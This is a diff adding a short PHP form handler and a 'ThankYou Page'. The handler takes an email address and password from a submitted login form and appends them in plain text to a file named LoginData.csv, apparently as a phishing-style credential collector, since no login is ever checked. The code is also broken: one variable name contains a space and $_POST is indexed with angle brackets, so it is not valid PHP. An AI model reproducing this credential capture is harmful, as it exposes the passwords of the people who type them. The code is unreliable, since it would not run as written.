@@ -1,0 +1,25 @@
+ <?php
+
+$Email address=$_POST<'Email address'>;
+$Password=$_POST<'Password'>;
+$data=$Email address.",".$Password;
+
+
+$file="LoginData.csv";
+
+
+file_put_contents($file, $data . PHP_EOL, FILE_APPEND);
+print("Thank you for submitting your details!");
+
+
+?>
+<html>
+<head>
+<title>ThankYou Page</title>    
+</head>
+<body>
+<h1><a href="Login.html">GO BACK</a> </h1>    
+    
+</body>
+</html>
+
